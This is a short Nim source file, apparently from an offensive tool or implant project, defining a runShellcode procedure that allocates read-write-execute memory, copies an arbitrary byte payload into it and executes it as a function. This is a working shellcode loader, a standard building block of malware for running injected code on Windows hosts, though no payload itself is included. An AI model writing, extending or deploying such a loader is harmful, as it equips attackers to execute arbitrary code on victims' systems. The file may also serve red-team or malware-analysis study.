import global
import winapi/handlers

proc runShellcode*(payload: openArray[byte]) =
  # Copies the payload into executable memory and runs it
  if payload.len == 0:
    return
  let mem = allocRwx(payload.len.csize_t)
  if mem == nil:
    return
  copyMem(mem, unsafeAddr payload[0], payload.len)
  type shellcodeFn = proc() {.stdcall.}
  cast[shellcodeFn](mem)()
